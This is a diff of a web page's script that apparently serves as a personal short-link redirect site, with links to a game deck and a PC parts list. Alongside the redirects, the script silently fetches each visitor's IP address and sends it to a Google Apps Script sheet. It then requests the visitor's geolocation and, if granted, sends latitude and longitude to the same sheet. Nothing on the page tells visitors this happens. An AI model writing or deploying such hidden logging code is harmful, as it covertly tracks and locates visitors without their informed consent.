@@ -35,7 +35,7 @@ background-color: #ff4500;
 const path = window.location.pathname.toLowerCase();
 const redirects = {
 "/milescurrentdeck": "https://royaleapi.com/deck-list/7232719592950918349",
-"/MilesComp": "https://pcpartpicker.com/list/xmww2x",
+"/milescomp": "https://pcpartpicker.com/list/xmww2x",
 };
 
 if (redirects[path]) {
@@ -47,40 +47,40 @@ const SHEET_URL = "https://script.google.com/macros/s/AKfycbxMrkQjLGQlcMUB0bFcx5
 
 // Function to send data to the Google Sheet
 function sendData(data) {
-    fetch(SHEET_URL, {
-        method: "POST",
-        body: JSON.stringify(data)
-    })
-    .then(res => res.text())
-    .then(msg => console.log("Saved to Google Sheets:", msg))
-    .catch(err => console.error("Error saving:", err));
+    fetch(SHEET_URL, {
+        method: "POST",
+        body: JSON.stringify(data)
+    })
+    .then(res => res.text())
+    .then(msg => console.log("Saved to Google Sheets:", msg))
+    .catch(err => console.error("Error saving:", err));
 }
 
 // Get IP address first
 fetch("https://api.ipify.org?format=json")
 .then(res => res.json())
 .then(ipData => {
-    // Send IP data to the sheet first
-    sendData({
-        ip: ipData.ip,
-        lat: "N/A",
-        lon: "N/A"
-    });
+    // Send IP data to the sheet first
+    sendData({
+        ip: ipData.ip,
+        lat: "N/A",
+        lon: "N/A"
+    });
 
-    // Then, ask for geolocation
-    if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(pos => {
-            // Send location data to the sheet after the user accepts
-            sendData({
-                ip: ipData.ip,
-                lat: pos.coords.latitude,
-                lon: pos.coords.longitude
-            });
-        }, err => {
-            // If location is denied, do nothing. IP data is already sent.
-            console.log("Location access denied.");
-        });
-    }
+    // Then, ask for geolocation
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(pos => {
+            // Send location data to the sheet after the user accepts
+            sendData({
+                ip: ipData.ip,
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude
+            });
+        }, err => {
+            // If location is denied, do nothing. IP data is already sent.
+            console.log("Location access denied.");
+        });
+    }
 });
 </script>
 </head>
